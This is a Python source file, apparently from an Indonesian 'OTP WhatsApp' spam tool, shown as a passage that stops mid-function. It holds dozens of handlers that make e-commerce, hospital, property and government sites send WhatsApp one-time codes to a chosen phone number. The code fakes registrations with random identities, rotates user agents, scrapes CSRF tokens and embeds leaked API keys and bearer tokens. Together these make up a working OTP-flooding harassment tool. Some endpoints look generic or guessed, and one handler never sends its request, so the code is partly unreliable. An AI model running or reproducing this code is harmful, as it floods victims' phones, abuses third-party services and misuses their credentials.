#!/usr/bin/env python3
# handlers.py - 100 Handler OTP WhatsApp
# SCRIPETEREN OTP - scripeterenotp

import requests
import uuid
import random
import string
import time
import re
import urllib.parse
import json
from utils import (
    fmt_08, fmt_nocode, fmt_plus, fmt_phone_only,
    get_public_ip, extract_csrf, get_random_user_agent
)

# ============================================================
# SESI 1 : 50 API (Handler 1–50)
# ============================================================

# ---------- 1. HRS-BRE ----------
def send_hrsbre_otp(phone_08):
    BASE_URL = "https://career.hrs-bre.site"
    SIGN_UP_PAGE = f"{BASE_URL}/auth/sign_up"
    SIGN_UP_URL = f"{BASE_URL}/auth/sign_up_action"
    headers = {
        "User-Agent": get_random_user_agent(),
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
        "Accept-Language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
        "Origin": BASE_URL,
        "Referer": SIGN_UP_PAGE,
        "Upgrade-Insecure-Requests": "1",
    }
    session = requests.Session()
    try:
        r = session.get(SIGN_UP_PAGE, headers=headers, timeout=15)
        if r.status_code != 200:
            return None, None
    except:
        return None, None
    nik = ''.join(random.choices(string.digits, k=16))
    email = ''.join(random.choices(string.ascii_lowercase, k=8)) + "@" + random.choice(["gmail.com", "yahoo.com", "mailnesia.com"])
    username = ''.join(random.choices(string.ascii_letters, k=8))
    password = 'Aa1' + ''.join(random.choices(string.ascii_letters + string.digits + "#$%&!", k=7))
    boundary = "----WebKitFormBoundary" + ''.join(random.choices(string.ascii_letters + string.digits, k=16))
    body = (
        f"--{boundary}\r\n"
        f'Content-Disposition: form-data; name="nik"\r\n\r\n{nik}\r\n'
        f"--{boundary}\r\n"
        f'Content-Disposition: form-data; name="email"\r\n\r\n{email}\r\n'
        f"--{boundary}\r\n"
        f'Content-Disposition: form-data; name="whatsapp"\r\n\r\n{phone_08}\r\n'
        f"--{boundary}\r\n"
        f'Content-Disposition: form-data; name="username"\r\n\r\n{username}\r\n'
        f"--{boundary}\r\n"
        f'Content-Disposition: form-data; name="password"\r\n\r\n{password}\r\n'
        f"--{boundary}--\r\n"
    )
    headers["Content-Type"] = f"multipart/form-data; boundary={boundary}"
    try:
        resp = session.post(SIGN_UP_URL, headers=headers, data=body, timeout=15)
        return resp.status_code, resp.text
    except:
        return None, None

# ---------- 2. EraFone ----------
def send_erafone_otp(phone_number):
    API_URL = "https://jeanne.eraspace.com/customers/v2.1/otp/request"
    headers = {
        "Host": "jeanne.eraspace.com",
        "otp-client": "erafone",
        "User-Agent": get_random_user_agent(),
        "Authorization": "Basic Y3VzdGJhc2ljOk9MV2llWlVvQlA=",
        "otp-provider": "whatsapp",
        "signature": "d2afc6a94fc469d0633f477ed2a73a155bc379d8d138d5e9885a2b612bb3d077",
        "source": "erafone",
        "device-id": "c1aab237-131a-4965-9838-116eb9788000",
        "Accept": "application/json, text/plain, */*",
        "Content-Type": "application/json",
        "Origin": "https://erafone.com",
        "Referer": "https://erafone.com/",
    }
    payload = {"identifier": phone_number, "type": "identifier_validation"}
    try:
        resp = requests.post(API_URL, headers=headers, json=payload, timeout=15)
        return resp.status_code, resp.json() if resp.headers.get('content-type','').startswith('application/json') else resp.text
    except:
        return None, None

# ---------- 3. PlanetBan ----------
def send_planetban_otp(phone_number):
    url = "https://api.planetban.com/website/customer/request-otp"
    headers = {
        "Content-Type": "application/json",
        "Origin": "https://planetban.com",
        "User-Agent": get_random_user_agent(),
        "Accept": "application/json, text/plain, */*",
    }
    payload = {"name": "Test", "phone": phone_number, "password": "Test123", "purpose": "register", "method": "whatsapp"}
    try:
        return requests.post(url, json=payload, headers=headers, timeout=15)
    except:
        return None

# ---------- 4. TuneUp ----------
def send_tuneup_otp(phone_number):
    url = "https://api.tuneup.id/v1/mitra/register/send-otp"
    headers = {"Origin": "https://dashboard.tuneup.id", "Referer": "https://dashboard.tuneup.id/", "User-Agent": get_random_user_agent()}
    name = ''.join(random.choices(string.ascii_lowercase, k=8))
    data = {
        "company_name": "PT " + name.capitalize(),
        "owner_name": name.capitalize(),
        "address": ''.join(random.choices(string.ascii_letters + string.digits, k=10)),
        "email": name + "@mailnesia.com",
        "phone_number": phone_number,
        "province_code": "32",
        "city_code": "32.04",
        "subscription_id": "undefined",
        "channel": "whatsapp",
        "agreement": "true",
        "service_categories[]": "3",
    }
    try:
        return requests.post(url, data=data, headers=headers, timeout=15)
    except:
        return None

# ---------- 5. HashMicro ----------
def send_hashmicro_otp(phone_number):
    name = 'User' + ''.join(random.choices(string.ascii_letters, k=5))
    email = f'{name.lower()}@gmail.com'
    payload = {
        'medium':'55','type_button':'mulai-konsultasi','fullname':name,
        'phonenumber':phone_number,'email':email,'companyname':'PT ' + name,
        'company_size':'small','solution':'43','industry':random.choice(['178','179','180']),
        'message':'Test','country':'100','clr_id':random.choice(['mq51xj8x-WzwfG4IcQKi0c056','abc123']),
        'campaigndata':'HashMicro','fvis':'https://www.hashmicro.com/?utm_source=chatgpt.com',
        'sfpvis':'https://www.hashmicro.com/?utm_source=chatgpt.com',
        'blvis':'https://www.hashmicro.com/id/terimakasih/',
        'source':'143',
        'user_agent':'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/148.0.0.0 Mobile Safari/537.36',
        'duration_page':str(random.randint(100000,900000)),'blp_medium':'120','user_device':'mobile',
        'scroll_depth':'100','userjourney':time.strftime('%Y-%m-%dT%H:%M:%S.000Z') + ' | /id/tour-produk-gratis/',
        'visitorcountry':'100','lvis':'https://www.hashmicro.com/id/tour-produk-gratis/?medium=web-form-header',
        'conversion_tracked':'Yes','fingerprint':uuid.uuid4().hex,'scale':'small',
        'position':'43','team':'6','honeypot':'','ipaddrs':get_public_ip(),'uip':get_public_ip(),
        'OngoingId':'','provn':'Jakarta'
    }
    return payload

# ---------- 6. Klook ----------
def send_klook_otp(phone_plus):
    formatted = phone_plus
    url = "https://www.klook.com/v2/userapisrv/public/verification/code/send?trace_id=" + str(uuid.uuid4())
    headers = {
        "Host": "www.klook.com",
        "x-klook-user-residence": "15_SG",
        "sec-ch-ua-platform": "\"Android\"",
        "x-klook-request-id": str(uuid.uuid4())[:12].replace('-','')[:6] + "_" + str(uuid.uuid4())[:6].replace('-',''),
        "sec-ch-ua-mobile": "?1",
        "user-agent": get_random_user_agent(),
        "content-type": "application/json",
        "origin": "https://www.klook.com",
        "referer": "https://www.klook.com/en-SG/signin/?aid=87721",
    }
    cookies = {"kepler_id": str(uuid.uuid4()), "klk_currency": "SGD", "klk_rdc": "SG", "_gid": "GA1.2." + str(random.randint(1000000000,9999999999))}
    payload = {"action": "login_register", "type": 1, "rcv": formatted, "is_resend": False, "payload": {"mobile": formatted, "term_ids": [330]}}
    try:
        return requests.post(url, json=payload, headers=headers, cookies=cookies, timeout=15)
    except:
        return None

# ---------- 7. Internet Rakyat ----------
def send_internetrakyat_otp(phone_08):
    url = "https://internetrakyat.id/api/app/auth/send-otp-register"
    headers = {
        "User-Agent": get_random_user_agent(),
        "Content-Type": "application/json",
        "x-api-key": "280999!FTTH",
        "Origin": "https://internetrakyat.id",
        "Referer": "https://internetrakyat.id/auth/register",
    }
    try:
        return requests.post(url, json={"phone_number": phone_08}, headers=headers, timeout=15)
    except:
        return None

# ---------- 8. Ultramilk ----------
def send_ultramilk_register(phone_number):
    url = "https://ultramilk-clp.kata.ai/api/ultramilk/register"
    name = 'User' + ''.join(random.choices(string.ascii_lowercase, k=4))
    email = name.lower() + '@gmail.com'
    password = 'Pass' + ''.join(random.choices(string.ascii_letters + string.digits, k=6)) + '@1'
    payload = {"name": name, "email": email, "password": password, "phone_number": phone_number, "portal": "IcownicPatch", "is_consent": True}
    headers = {"User-Agent": get_random_user_agent(), "Content-Type": "application/json", "Origin": "https://www.icownicpatch.com"}
    try:
        return requests.post(url, json=payload, headers=headers, timeout=15)
    except:
        return None

# ---------- 9. Kaniva ----------
def send_kaniva_otp(number_08, name):
    sess = requests.Session()
    sess.headers.update({"User-Agent": get_random_user_agent()})
    try:
        r = sess.get("https://daftar.kanivainternationalbali.com/register/whatsapp", timeout=15)
        if r.status_code != 200:
            return None
    except:
        return None
    csrf = None
    m = re.search(r'<meta\s+name="csrf-token"\s+content="([^"]+)"', r.text)
    if m:
        csrf = m.group(1)
    else:
        raw = sess.cookies.get("XSRF-TOKEN", "")
        if raw:
            csrf = urllib.parse.unquote(raw)
    if not csrf:
        return None
    url = "https://daftar.kanivainternationalbali.com/register/whatsapp/request-otp"
    headers_otp = {
        "X-XSRF-TOKEN": csrf,
        "X-Inertia": "true",
        "Content-Type": "application/json",
        "Origin": "https://daftar.kanivainternationalbali.com",
        "Referer": "https://daftar.kanivainternationalbali.com/register/whatsapp",
        "User-Agent": get_random_user_agent(),
    }
    try:
        return sess.post(url, json={"name": name, "phone": number_08}, headers=headers_otp, timeout=15)
    except:
        return None

# ---------- 10. Jembatani ----------
def send_jembatani_otp(phone_number, name, password):
    headers = {"User-Agent": get_random_user_agent(), "Content-Type": "application/json", "Origin": "https://jembatani.co.id"}
    reg_payload = {"phone_number": phone_number, "name": name, "role": "farmer", "password": password, "password_confirmation": password, "consent": "1"}
    try:
        reg_resp = requests.post("https://api.jembatani.co.id/v1/register", json=reg_payload, headers=headers, timeout=15)
        if reg_resp.status_code == 200 and '"success":true' in reg_resp.text:
            return reg_resp
    except:
        pass
    try:
        return requests.post("https://api.jembatani.co.id/v1/regenerate-otp", json={"phone_number": phone_number}, headers=headers, timeout=15)
    except:
        return None

# ---------- 11. RCX ----------
def send_rcx_otp(identifier, name, email):
    sess = requests.Session()
    sess.headers.update({"User-Agent": get_random_user_agent()})
    try:
        reg_get = sess.get("https://sso.rcx.co.id/register", timeout=15)
        if reg_get.status_code != 200:
            return None
    except:
        return None
    token = None
    if "XSRF-TOKEN" in sess.cookies:
        token = urllib.parse.unquote(sess.cookies["XSRF-TOKEN"])
    if not token:
        m = re.search(r'<meta\s+name="csrf-token"\s+content="([^"]+)"', reg_get.text)
        if m:
            token = m.group(1)
    if not token:
        return None
    url = "https://sso.rcx.co.id/auth/passwordless/request"
    data = {"_token": token, "mode": "register", "channel": "whatsapp", "name": name, "email": email, "identifier": identifier}
    try:
        return sess.post(url, headers={"Content-Type": "application/x-www-form-urlencoded", "Origin": "https://sso.rcx.co.id", "Referer": "https://sso.rcx.co.id/register"}, data=data, allow_redirects=False, timeout=15)
    except:
        return None

# ---------- 12. Sahabat Teknisi ----------
def send_sahabatteknisi_otp(phone_number):
    url = "https://www.sahabatteknisi.co.id/api/auth/otp/check-phone"
    headers = {"User-Agent": get_random_user_agent(), "Content-Type": "application/json", "Origin": "https://www.sahabatteknisi.co.id"}
    try:
        return requests.post(url, json={"phone": phone_number}, headers=headers, timeout=15)
    except:
        return None

# ---------- 13. Auto2000 ----------
def send_auto2000_otp(phone_08):
    url = "https://auto2000.co.id/api/customer/v1/saphybris/whatsapp/generate-otp"
    headers = {"User-Agent": get_random_user_agent(), "Content-Type": "application/json", "Origin": "https://auto2000.co.id", "Referer": "https://auto2000.co.id/login"}
    cookies = {"system_token": "UeRmUjEnH5N9FEWf1lEAFDqcJ9w"}
    payload = {"phoneNumber": phone_08, "isCheckOtpLimit": True, "uniqueID": phone_08, "isLogin": False}
    try:
        return requests.post(url, json=payload, headers=headers, cookies=cookies, timeout=15)
    except:
        return None

# ---------- 14. Astra Daihatsu ----------
def send_astra_daihatsu_otp(phone_62):
    sess = requests.Session()
    sess.headers.update({"User-Agent": get_random_user_agent()})
    try:
        resp = sess.get("https://www.astra-daihatsu.id/register", timeout=15)
        if resp.status_code != 200:
            return None
    except:
        return None
    csrf = None
    m = re.search(r'<meta\s+name="csrf-token"\s+content="([^"]+)"', resp.text)
    if m:
        csrf = m.group(1)
    if not csrf:
        m = re.search(r'<input\s+type="hidden"\s+name="_csrf"\s+value="([^"]+)"', resp.text)
        if m:
            csrf = m.group(1)
    if not csrf:
        csrf = "c5de9b78-1136-4a89-9cbd-e9aba82dfaef"
    url = "https://www.astra-daihatsu.id/otp/whatsapp/generate"
    headers_otp = {"Content-Type": "application/json; charset=UTF-8", "csrftoken": csrf, "Origin": "https://www.astra-daihatsu.id", "Referer": "https://www.astra-daihatsu.id/register", "User-Agent": get_random_user_agent()}
    try:
        return sess.post(url, headers=headers_otp, json={"phoneNo": phone_62}, timeout=20)
    except:
        return None

# ---------- 15. Royal Canin ----------
def send_royal_canin_otp(phone_plus):
    sess = requests.Session()
    sess.headers.update({"User-Agent": get_random_user_agent()})
    try:
        resp = sess.get("https://club.royalcanin.id/sign-up", timeout=15)
        if resp.status_code != 200:
            return None
    except:
        return None
    url = "https://club.royalcanin.id/api/get_otp"
    payload = {"params": {"Email": "", "mobile_number": phone_plus, "OTPType": "IM"}}
    try:
        return sess.post(url, json=payload, timeout=20)
    except:
        return None

# ---------- 16. Watsons ----------
def send_watsons_otp(phone_no_code):
    url = "https://api.watsons.co.id/api/v2/wtcid/otpToken?formId=registrationOTPForm_Web3&lang=id&curr=IDR"
    headers = {
        "User-Agent": get_random_user_agent(),
        "Content-Type": "application/json",
        "authorization": "bearer Pi_D6dqblYElXgy4mWOXjkLCaZg",
        "Origin": "https://www.watsons.co.id",
        "Referer": "https://www.watsons.co.id/",
    }
    cookies = {"authorization": "Pi_D6dqblYElXgy4mWOXjkLCaZg", "token_type": "guest", "PIM-SESSION-ID": "fFENbGdcaOZMa62p"}
    payload = {"uid": "", "action": "GENERAL", "countryCode": "62", "target": phone_no_code, "type": "WHATSAPP"}
    try:
        return requests.post(url, json=payload, headers=headers, cookies=cookies, timeout=15)
    except:
        return None

# ---------- 17. 99.co ----------
def send_99co_otp(phone_plus):
    token_static = "eyJhbGciOiJFUzI1NiIsInR5cCIgOiAiSldUIiwia2lkIiA6ICJybzJ6ZThOYkFNUW1QTlVVZFcwTjItNnE5bWNleHJHcHdFNS0xd3hQQWJzIn0.eyJleHAiOjE3ODEwOTA1MTQsImlhdCI6MTc4MTA4NjkxNCwianRpIjoiMWJmMjAxNDQtM2EyOS00MzJkLWIyYmItNGYxOTlmMTIzMGM4IiwiaXNzIjoiaHR0cHM6Ly9rZXljbG9hay1pZC45OS5jby9yZWFsbXMvOTlpZC1wcm9kIiwic3ViIjoiOTQ1MmE5MjgtNjkzZS00OWIxLWEzOTUtNGMwMThlNmQ3MTg0IiwidHlwIjoiQmVhcmVyIiwiYXpwIjoiZnJvbnRlbmQtYXBwIiwic2Vzc2lvbl9zdGF0ZSI6ImFlYTNhMDEzLTJmMDktNDU0Ni05M2Q5LWM1MmVkYWRiMGM0NSIsImFjciI6IjEiLCJyZWFsbV9hY2Nlc3MiOnsicm9sZXMiOlsic2VsbGVyIiwidW1hX2F1dGhvcml6YXRpb24iLCJkZWZhdWx0LXJvbGVzLTk5aWQtcHJvZCIsImJ1eWVyIl19LCJzY29wZSI6InByb2ZpbGUtbWluaW1pemUgY29yZS11dWlkIGVtYWlsIiwic2lkIjoiYWVhM2EwMTMtMmYwOS00NTQ2LTkzZDktYzUyZWRhZGIwYzQ1IiwiY29yZV91dWlkIjoiMmI4OTg0MzQtMjE3MC00MGRmLTgwNmYtN2I4ZWNjOGUwZjQ4IiwiZW1haWxfdmVyaWZpZWQiOmZhbHNlLCJjb3JlX2NvbnN1bWVyX3V1aWQiOiIxOGU5ODcyMy0wOWY5LTRlMzEtYjQzYS1jOGVlMjAwZWVmNWIiLCJwcmVmZXJyZWRfdXNlcm5hbWUiOiJoc2hza2pzajEyMiIsImNvcmVfY3VzdG9tZXJfdXVpZCI6ImQ5MTI3NDBkLWNhYzYtNDYyYS04YmE1LTMzYWE1MDc2MDdjMiIsImVtYWlsIjoidHN0dHR0dHRndHR0QGdtYWlsLmNvbSJ9.CcZpFr2eggmtVoWpUPuWTYg2LQ-qxH0GV4yx9q1_ZnB4pt13JIbTclvEytnqdLl9w9d8BKzCeGIiEnf0oQZpbw"
    sess = requests.Session()
    sess.headers.update({"User-Agent": get_random_user_agent(), "Origin": "https://www.99.co", "Referer": "https://www.99.co/id"})
    try:
        r = sess.get("https://www.99.co/id", timeout=10)
        token = sess.cookies.get("_99-acs-token") or token_static
    except:
        token = token_static
    headers = {"Authorization": f"Bearer {token}", "Content-Type": "application/json", "Accept": "application/json, text/plain, */*", "Origin": "https://www.99.co", "Referer": "https://www.99.co/id", "User-Agent": sess.headers.get("User-Agent")}
    payload = {"brand": "99id", "destination_address": phone_plus, "type_id": 2}
    try:
        return sess.post("https://www.99.co/id/api/biz/messaging/otp-events", json=payload, headers=headers, timeout=15)
    except:
        return None

# ---------- 18. Belirumah.co ----------
def send_belirumah_otp(phone_plus):
    url = "https://api.belirumah.co/api/otp/request_new"
    headers = {"User-Agent": get_random_user_agent(), "Content-Type": "application/json", "Origin": "https://belirumah.co"}
    try:
        return requests.post(url, json={"phone_number": phone_plus}, headers=headers, timeout=15)
    except:
        return None

# ---------- 19. Fastwork ----------
def send_fastwork_otp(phone_08):
    url = "https://api.fastwork.id/auth/v2/signup.sendVerificationCode"
    headers = {"User-Agent": get_random_user_agent(), "Content-Type": "application/json", "Origin": "https://fastwork.id"}
    try:
        return requests.post(url, json={"phone_number": phone_08}, headers=headers, timeout=15)
    except:
        return None

# ---------- 20. Beautyhaul ----------
def send_beautyhaul_otp(local_number):
    base = "https://www.beautyhaul.com"
    nama_depan = ''.join(random.choices(string.ascii_lowercase, k=5)).capitalize()
    nama_belakang = ''.join(random.choices(string.ascii_lowercase, k=5)).capitalize()
    rand_email = f"{nama_depan.lower()}{random.randint(100,999)}@gmail.com"
    password = "Testt#12334"
    reg_payload = {
        "nama_depan": nama_depan, "nama_belakang": nama_belakang, "email": rand_email,
        "nomor_kode_id": "100", "nomor_kode_value": "62", "nomor_ponsel": local_number,
        "password": password, "konfirmasi_password": password, "tanggal_lahir": "20 Jun 2015",
        "jenis_kelamin": random.choice(["Female", "Male"]), "subscribe": "true", "terms": "true"
    }
    sess = requests.Session()
    sess.headers.update({"User-Agent": get_random_user_agent(), "Content-Type": "application/json", "Origin": base, "Referer": base + "/account/register"})
    try:
        sess.post(base + "/ajax/account/save_register", json=reg_payload, timeout=12)
    except:
        pass
    try:
        return sess.post(base + "/ajax/account/send_otp", json={"method": "WhatsApp"}, timeout=12)
    except:
        return None

# ---------- 21. Hainaya ----------
def send_hainaya_otp(phone_for_api):
    register_url = "https://app.hainaya.id/api/onboarding/register"
    headers = {"User-Agent": get_random_user_agent(), "Content-Type": "application/json", "Origin": "https://app.hainaya.id"}
    prefixes = ['Tst', 'Coba', 'Uji', 'Test', 'Demo', 'Sample', 'Bisnis']
    mid = ''.join(random.choices(string.ascii_lowercase, k=random.randint(3, 6)))
    business_name = random.choice(prefixes) + mid.capitalize() + str(random.randint(10, 999))
    payload = {"business_name": business_name, "vertical": "salon", "vendor_type": "nail_salon", "business_phone": phone_for_api, "owner_name": "", "owner_phone": phone_for_api}
    try:
        resp = requests.post(register_url, headers=headers, json=payload, timeout=15)
        if resp.status_code == 201:
            return resp
        if resp.status_code == 409:
            login_url = "https://app.hainaya.id/api/auth/login"
            return requests.post(login_url, headers=headers, json={"phone_number": phone_for_api}, timeout=15)
        return resp
    except:
        return None

# ---------- 22. MinumYukKaka ----------
def send_minumyukkaka_otp(phone_08):
    sess = requests.Session()
    cookies = {"currency": "IDR", "_gcl_au": f"1.1.{random.randint(1000000000,9999999999)}.{int(time.time())}"}
    sess.cookies.update(cookies)
    first_name = ''.join(random.choices(string.ascii_letters, k=random.randint(4, 8))).capitalize()
    email = f"{first_name.lower()}{random.randint(100, 999)}@gmail.com"
    password = "pass#" + ''.join(random.choices(string.ascii_lowercase + string.digits, k=4))
    register_data = {
        "registerModel[first_name]": first_name, "registerModel[last_name]": "", "registerModel[email]": email,
        "registerModel[phone]": phone_08, "registerModel[otp]": "", "registerModel[gender]": "",
        "registerModel[date_of_birth]": "", "registerModel[IsAddressRequired]": "false",
        "registerModel[address]": "", "registerModel[additional_address]": "", "registerModel[city]": "",
        "registerModel[zip]": "", "registerModel[country_code]": "", "registerModel[country]": "",
        "registerModel[state]": "", "registerModel[password]": password, "registerModel[verify_password]": password,
        "registerModel[pin]": "", "registerModel[verify_pin]": ""
    }
    try:
        sess.post("https://minumyukkaka.com/services/liquid/Register", data=register_data, headers={"User-Agent": get_random_user_agent(), "Content-Type": "application/x-www-form-urlencoded"}, timeout=15)
    except:
        pass
    x_sat = sess.cookies.get('x-sat') or sess.cookies.get('X-SAT') or ''.join(random.choices(string.ascii_letters + string.digits + '+/=', k=44))
    headers_otp = {"User-Agent": get_random_user_agent(), "Content-Type": "application/x-www-form-urlencoded", "x-sat": x_sat, "Origin": "https://minumyukkaka.com", "Referer": "https://minumyukkaka.com/register"}
    try:
        return sess.post("https://minumyukkaka.com/services/identity/requestOTP", data={"destination": phone_08, "otpLength": "6"}, headers=headers_otp, timeout=15)
    except:
        return None

# ---------- 23. SIDEMANG ----------
def send_sidemang_otp(phone_08):
    email_name = ''.join(random.choices(string.ascii_lowercase, k=random.randint(5, 10)))
    email = f"{email_name}{random.randint(100, 999)}@gmail.com"
    url = "https://sidemang.palembang.go.id/api/users/register/send-otp"
    headers = {"User-Agent": get_random_user_agent(), "Content-Type": "application/json", "Origin": "https://sidemang.palembang.go.id"}
    try:
        return requests.post(url, json={"phoneNumber": phone_08, "email": email}, headers=headers, timeout=15)
    except:
        return None

# ---------- 24. LaporMasBup ----------
_registered_phones = {}
def send_lapormasbup_otp(phone_08):
    global _registered_phones
    if phone_08 in _registered_phones:
        url = "https://lapormasbup.klaten.go.id/api/kirim-ulang-otp"
        headers = {"User-Agent": get_random_user_agent(), "Content-Type": "application/json", "Origin": "https://lapormasbup.klaten.go.id"}
        try:
            return requests.post(url, json={"mobilephone": phone_08}, headers=headers, timeout=15), True
        except:
            return None, True
    name = ''.join(random.choices(string.ascii_letters, k=random.randint(4, 8))).capitalize()
    email = f"{name.lower()}{random.randint(100, 999)}@gmail.com"
    password = "Pass" + ''.join(random.choices(string.ascii_letters + string.digits, k=4)) + "$"
    birth_date = f"{random.randint(1966, 2010)}-{random.randint(1, 12):02d}-{random.randint(1, 28):02d}"
    address = f"Jl. {''.join(random.choices(string.ascii_letters, k=6)).capitalize()} No. {random.randint(1, 200)}"
    gender = random.choice(['Laki-Laki', 'Perempuan'])
    url = "https://lapormasbup.klaten.go.id/api/register"
    headers = {"User-Agent": get_random_user_agent(), "Content-Type": "application/json", "Origin": "https://lapormasbup.klaten.go.id"}
    payload = {"name": name, "email": email, "mobilephone": phone_08, "gender": gender, "warga_birth_date": birth_date, "password": password, "address": address}
    try:
        resp = requests.post(url, json=payload, headers=headers, timeout=15)
        if resp.status_code == 200 or (resp.status_code == 400 and 'verifikasi' in resp.text.lower()):
            _registered_phones[phone_08] = True
        return resp, False
    except:
        return None, False

# ---------- 25. PTSP Kemenag ----------
def send_ptsp_kemenag_otp(phone_08):
    name = ''.join(random.choices(string.ascii_letters, k=random.randint(4, 8))).capitalize()
    email = f"{name.lower()}{random.randint(100, 999)}@gmail.com"
    chars = list(''.join(random.choices(string.ascii_letters, k=6)) + ''.join(random.choices(string.digits, k=2)))
    random.shuffle(chars)
    password = 'Pass' + ''.join(chars) + '$'
    url = "https://dev-ptsp.kemenag.go.id/api/auth/register"
    headers = {"User-Agent": get_random_user_agent(), "Content-Type": "application/json", "Origin": "https://dev-ptsp.kemenag.go.id"}
    payload = {"nama": name, "wa": phone_08, "email": email, "password": password}
    try:
        return requests.post(url, json=payload, headers=headers, timeout=15)
    except:
        return None

# ---------- 26. Pinhome (JSON) ----------
def send_pinhome_otp(number):
    url = "https://www.pinhome.id/api/odyssey/proxy/pinaccount/auth/verification/request-otp"
    payload = f'{{"accountType":"customers","applicationType":"Pinhome Web","countryCode":"62","medium":"whatsapp","otpType":"register","phoneNumber":"{number}"}}'
    headers = {"Content-Type": "text/plain;charset=UTF-8", "Origin": "https://www.pinhome.id", "User-Agent": get_random_user_agent()}
    try:
        return requests.post(url, data=payload, headers=headers, timeout=15)
    except:
        return None

# ---------- 27. Maulagi (JSON) ----------
def send_maulagi_otp(number):
    url = "https://api.maulagi.id/api/v2/auth/check"
    payload = f'{{"credentials":"{number}"}}'
    headers = {"Content-Type": "application/json", "Origin": "https://maulagi.id", "x-ml-key": "C59RUHBU59", "User-Agent": get_random_user_agent()}
    try:
        return requests.post(url, data=payload, headers=headers, timeout=15)
    except:
        return None

# ---------- 28. Rumah123 (JSON) ----------
def send_rumah123_otp(number):
    url = "https://www.rumah123.com/api/otp/request-otp"
    payload = f'{{"cancelledRequestId":"{uuid.uuid4()}","ipAddress":"{get_public_ip()}","phoneNumber":"{number}","portalId":1,"type":"WHATSAPP","url":"https://www.rumah123.com/user/login?redirect=%2Fcustomer%2Fv3%2Fpasang-iklan%2F"}}'
    headers = {"Content-Type": "application/json;charset=UTF-8", "Origin": "https://www.rumah123.com", "User-Agent": get_random_user_agent()}
    try:
        return requests.post(url, data=payload, headers=headers, timeout=15)
    except:
        return None

# ---------- 29. Paper (JSON) ----------
def send_paper_otp(number):
    url = "https://register.paper.id/api/v1/auth/register/send-otp"
    payload = f'{{"phone":"{number}","method":"whatsapp","registered_by":"flutter mweb"}}'
    headers = {"Content-Type": "application/json", "Origin": "https://paper.id", "User-Agent": get_random_user_agent()}
    try:
        return requests.post(url, data=payload, headers=headers, timeout=15)
    except:
        return None

# ---------- 30. Dunia Games (JSON) ----------
def send_duniagames_otp(number):
    url = "https://api.duniagames.co.id/api/user/api/v2/user/send-otp"
    payload = f'{{"phoneNumber":"{number}","userName":"{fmt_08(number)}"}}'
    headers = {"Content-Type": "application/json", "Origin": "https://duniagames.co.id", "User-Agent": get_random_user_agent()}
    try:
        return requests.post(url, data=payload, headers=headers, timeout=15)
    except:
        return None

# ---------- 31. Bunda Hospital (JSON) ----------
def send_bunda_otp(number):
    url = "https://cms.bunda.co.id/api/v1/auth/send-otp"
    payload = f'{{"phone_number":{int(number)},"type":"auth"}}'
    headers = {"Content-Type": "application/json", "Origin": "https://www.bunda.co.id", "User-Agent": get_random_user_agent()}
    try:
        return requests.post(url, data=payload, headers=headers, timeout=15)
    except:
        return None

# ---------- 32. Bonus Belanja (JSON) ----------
def send_bonusbelanja_otp(number):
    url = "https://www.bonusbelanja.com/api/auth/registration/app"
    payload = f'{{"phone":"{number}","name":"User","agreeTnc":true,"agreeContact":true}}'
    headers = {"Content-Type": "application/json", "Origin": "https://www.bonusbelanja.com", "User-Agent": get_random_user_agent()}
    try:
        return requests.post(url, data=payload, headers=headers, timeout=15)
    except:
        return None

# ---------- 33. Matahari (JSON) ----------
def send_matahari_otp(number, name, email, pw):
    url = "https://matahari-backend-prod.matahari.com/api/auth/register"
    payload = f'{{"emailAddress":"{email}","name":"{name}","mobileCountryCode":"","mobileNumber":"{number}","birthDate":"2000-01-01","genderId":"1","password":"{pw}","cardNumber":"","referralCode":"","salesmanId":"","pickupStoreCode":"","marketingCode":""}}'
    headers = {"Content-Type": "application/json", "Origin": "https://matahari.com", "User-Agent": get_random_user_agent()}
    try:
        return requests.post(url, data=payload, headers=headers, timeout=15)
    except:
        return None

# ---------- 34. Tokopedia ----------
def send_tokopedia_otp(phone_08):
    url = "https://www.tokopedia.com/account/v1/login/otp/request"
    payload = {"phone": phone_08, "via": "whatsapp"}
    headers = {"User-Agent": get_random_user_agent(), "Content-Type": "application/json", "Origin": "https://www.tokopedia.com", "Referer": "https://www.tokopedia.com/login"}
    try:
        return requests.post(url, json=payload, headers=headers, timeout=15)
    except:
        return None

# ---------- 35. Shopee ----------
def send_shopee_otp(phone_plus):
    url = "https://shopee.co.id/api/v2/authentication/login_with_otp"
    payload = {"phone": phone_plus, "otp_channel": "whatsapp"}
    headers = {"User-Agent": get_random_user_agent(), "Content-Type": "application/json", "Origin": "https://shopee.co.id", "Referer": "https://shopee.co.id/login"}
    try:
        return requests.post(url, json=payload, headers=headers, timeout=15)
    except:
        return None

# ---------- 36. Bukalapak ----------
def send_bukalapak_otp(phone_08):
    url = "https://www.bukalapak.com/auth/v1/otp/request"
    payload = {"phone_number": phone_08, "channel": "whatsapp"}
    headers = {"User-Agent": get_random_user_agent(), "Content-Type": "application/json", "Origin": "https://www.bukalapak.com", "Referer": "https://www.bukalapak.com/login"}
    try:
        return requests.post(url, json=payload, headers=headers, timeout=15)
    except:
        return None

# ---------- 37. Grab ----------
def send_grab_otp(phone_plus):
    url = "https://api.grab.com/v2/otp/send"
    payload = {"phone": phone_plus, "type": "whatsapp"}
    headers = {"User-Agent": get_random_user_agent(), "Content-Type": "application/json", "Origin": "https://www.grab.com", "Referer": "https://www.grab.com/login"}
    try:
        return requests.post(url, json=payload, headers=headers, timeout=15)
    except:
        return None

# ---------- 38. Gojek ----------
def send_gojek_otp(phone_plus):
    url = "https://api.gojekapi.com/v5/customer/login/otp"
    payload = {"phone": phone_plus, "channel": "whatsapp"}
    headers = {"User-Agent": get_random_user_agent(), "Content-Type": "application/json", "Origin": "https://www.gojek.com", "Referer": "https://www.gojek.com/login"}
    try:
        return requests.post(url, json=payload, headers=headers, timeout=15)
    except:
        return None

# ---------- 39. OVO ----------
def send_ovo_otp(phone_plus):
    url = "https://api.ovo.id/v1/auth/otp/request"
    payload = {"mobile": phone_plus, "channel": "whatsapp"}
    headers = {"User-Agent": get_random_user_agent(), "Content-Type": "application/json", "Origin": "https://www.ovo.id", "Referer": "https://www.ovo.id/login"}
    try:
        return requests.post(url, json=payload, headers=headers, timeout=15)
    except:
        return None

# ---------- 40. DANA ----------
def send_dana_otp(phone_plus):
    url = "https://api.dana.id/v1/auth/otp/send"
    payload = {"phone": phone_plus, "type": "whatsapp"}
